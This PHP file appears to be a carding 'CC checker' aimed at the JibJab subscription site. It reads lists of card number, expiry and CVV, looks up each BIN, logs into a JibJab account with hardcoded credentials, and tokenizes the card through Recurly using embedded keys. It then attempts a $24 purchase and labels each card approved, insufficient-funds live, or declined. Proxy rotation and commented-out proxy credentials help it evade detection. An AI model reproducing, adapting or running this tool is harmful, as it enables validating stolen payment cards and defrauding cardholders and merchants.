<?php 

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');




if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function str_between(string $string, string $start, string $end, bool $includeDelimiters = false, int &$offset = 0): ?string
{
    if ($string === '' || $start === '' || $end === '') return null;

    $startLength = strlen($start);
    $endLength = strlen($end);

    $startPos = strpos($string, $start, $offset);
    if ($startPos === false) return null;

    $endPos = strpos($string, $end, $startPos + $startLength);
    if ($endPos === false) return null;

    $length = $endPos - $startPos + ($includeDelimiters ? $endLength : -$startLength);
    if (!$length) return '';

    $offset = $startPos + ($includeDelimiters ? 0 : $startLength);

    $result = substr($string, $offset, $length);

    return ($result !== false ? $result : null);
}

function str_between_all(string $string, string $start, string $end, bool $includeDelimiters = false, int &$offset = 0): ?array
{
    $strings = [];
    $length = strlen($string);

    while ($offset < $length)
    {
        $found = str_between($string, $start, $end, $includeDelimiters, $offset);
        if ($found === null) break;

        $strings[] = $found;
        $offset += strlen($includeDelimiters ? $found : $start . $found . $end); // move offset to the end of the newfound string
    }

    return $strings;
}
//////Capture The Location Of Redirect
if (preg_match('~Location: (.*)~i', $curl, $match)) {
   $location = trim($match[1]);
}
function milliseconds() {
    $mt = explode(' ', microtime());
    return ((int)$mt[1]) * 1000 + ((int)round($mt[0] * 1000));
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function AllinOne($data = 36){
    return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);
};

$guid = AllinOne();
$muid = AllinOne();
$sid = AllinOne();
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
function RandomString($length)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);
$number6 = substr($cc,0,6);
$bin = substr($cc,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function emailGenerate($length = 14)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    $serve_arr = array("@gmail.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    return ''.$randomString.''.$serv_rnd.'';
}

function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
//////////////////////////////////////////////////////////////////////////////////////////////


$firstn_number = substr($cc, 0, 1);
if ($firstn_number == 4) {
    $cyber_type = '001';
    $ccn_type = 'visa';
    $cc_type = 'VISA';
    $braintree_type = 'Visa';
    $chase_type = 'chasepaytech%3AVI';
    $firstdata_type = '0';
}
if ($firstn_number == 5) {
    $cyber_type = '002';
    $cc_type = 'Master Card';
    $ccn_type = 'mast';
    $braintree_type = 'MasterCard';
    $chase_type = 'chasepaytech%3AMC';
    $firstdata_type = '1';  
}



/////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://uddipta-bincheck.herokuapp.com/api?bin='.$bin.'&auth=UddiptaBChk231');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'referer: https://bincheck.io/';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-gpc: 1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);



$binshit = json_decode($curl, TRUE);

$cardbrand = $binshit['brand'];
$cardtype = $binshit['type'];
$cardlevel = $binshit['level'];
$bankphone = $binshit['phone'];
$banksite = $binshit['website'];
$bincountry = $binshit['country'];
$bankname = $binshit['bank'];
$countryemoji = $binshit['flag'];
$currency = $binshit['currency'];                               






////////////////////////////===[Proxys]===//////////////
$navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );

$UA = $navegadoresFirefox[array_rand($navegadoresFirefox)];
$randemail = RandomString(10);
                                    
                                    
$usernameG = usernameGen();

$passwordG = passwordGen();


##################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################                               
                                    

////===[Webshare proxys for cc checker]===////



/*$Websharegay = rand(0,1000);

$rp1 = array(
1 => 'ewdoegnz-rotate:dmv1vnasu1mm',
//3 => 'hfsauacn-rotate:31tma8s2b8h0',
//4 => 'zclloral-rotate:gco8iuiyz5oq',
); 
$rpt = array_rand($rp1);
$rotate = $rp1[$rpt];
$ip = array(
1 => 'socks5://p.webshare.io:80',
2 => 'http://p.webshare.io:80',
); 
$socks = array_rand($ip);
$socks5 = $ip[$socks];

$url = "https://api.ipify.org/";   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "LIVE! 🟢";
}
if (empty($ip1)){
$ip = "DEAD!:[".$rotate."]";
}

echo '[  IP: '.$ip.' ] ';*/
//////==============[End Proxy Section]==============//////


                                    


                       
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://origin-prod-phoenix.jibjab.com/v1/oauth/token');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: origin-prod-phoenix.jibjab.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Length: 84';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36';
$headers[] = 'Content-Type: application/json;charset=UTF-8';
$headers[] = 'Origin: https://www.jibjab.com';
$headers[] = 'X-Requested-With: com.xbrowser.play';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://www.jibjab.com/';
//$headers[] = 'Accept-Encoding: gzip, deflate';
$headers[] = 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"grant_type":"password","username":"Mavederrick@gmail.com","password":"fuckyou@33"}');
$curl = curl_exec($ch);
curl_close($ch);
//echo $curl;
// echo $curl;

$accesstoken = trim(strip_tags(getStr($curl,'"access_token":"','"')));
//echo $accesstoken;



                                    
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://origin-prod-phoenix.jibjab.com/v1/user');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: origin-prod-phoenix.jibjab.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'Authorization: Bearer'.$accesstoken.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36';
$headers[] = 'Origin: https://www.jibjab.com';
$headers[] = 'X-Requested-With: com.xbrowser.play';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://www.jibjab.com/';
$headers[] = 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);
//echo $curl;
//$bitchid = trim(strip_tags(getStr($curl,'"id":"','"')));
//echo $bitchid;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.recurly.com/js/v1/token');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.recurly.com';
$headers[] = 'content-length: 758';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'accept: */*';
$headers[] = 'origin: https://api.recurly.com';
$headers[] = 'x-requested-with: com.xbrowser.play';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://api.recurly.com/js/v1/field.html';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'token=_mLIQwWmTUeAjn7bUvfR1g&first_name=Ryan&last_name=Walu&postal_code=10080&country=US&number='.$cc.'&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=en-GB&browser[referrer_url]=https%3A%2F%2Fwww.jibjab.com%2Fcreate%2Fpurchase%2Fpayment&browser[screen_height]=851&browser[screen_width]=393&browser[time_zone_offset]=-330&browser[user_agent]=Mozilla%2F5.0%20%28Linux%3B%20Android%2011%3B%20Redmi%20Note%208%20Pro%20Build%2FRP1A.200720.011%3B%20wv%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Version%2F4.0%20Chrome%2F93.0.4577.62%20Mobile%20Safari%2F537.36&cvv='.$cvv.'&month='.$mes.'&year='.$ano.'&version=4.17.1&key=ewr1-KPcJhelf3KRrs3BTipdmLo&deviceId=X2Sdf2Oyr2fkp39b&sessionId=AcBn3xEsBLq5H1fI&instanceId=3IqsUcNz1vXkekRF');
$curl = curl_exec($ch);
curl_close($ch);
//echo $curl;
$tokenid = trim(strip_tags(getStr($curl,'"id":"','"')));
//echo $tokenid;

#4

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://origin-prod-phoenix.jibjab.com/v1/subscriptions');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: origin-prod-phoenix.jibjab.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Length: 726';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'Authorization: Bearer '.$accesstoken.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36';
$headers[] = 'Content-Type: application/json;charset=UTF-8';
$headers[] = 'Origin: https://www.jibjab.com';
$headers[] = 'X-Requested-With: com.xbrowser.play';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://www.jibjab.com/';
$headers[] = 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"data":{"type":"subscriptions","attributes":{"payment":{"first-name":"Ryan","last-name":"Walu","postal-code":"10080","recurly-token":"'.$tokenid.'","template-slug":""}},"relationships":{"payment-provider":{"data":{"attributes":{"name":"recurly"},"type":"payment-providers"}},"offer":{"data":{"id":"e5aabd93-aa2f-418f-ba6d-898101c9f445","attributes":{"name":"2400-per-year","display-name":"","description":"$24 USD per year, billed in advance, auto-renewal","price":"24.0","duration":1,"duration-unit":"year","image":"https://cf-assets-prod-phoenix.jibjab.com/offers/e5aabd93-aa2f-418f-ba6d-898101c9f445/original/9388a48b-a4a4-4e26-bee5-31798fa9b6c9-Offer_Group_-_2.00_2x.png","status":"active"},"type":"offers"}}}}}');
$curl = curl_exec($ch);
curl_close($ch);
//echo $curl;

echo $detail = trim(strip_tags(getStr($curl,'detail":"','"')));



if
(strpos($session,  '"cvc_check": "pass"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ LEGEND] $detail </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

#clk are a bunch of gay guys

elseif
(strpos($session,  "Your transaction was declined due to insufficient funds in your account. Please use a different card or contact your bank.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>INSUFFICIENT LIVE [ WOLFIE] $detail </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


else {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>$detail // [ WOLFIE]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br> ";
}




unlink('cookie.txt');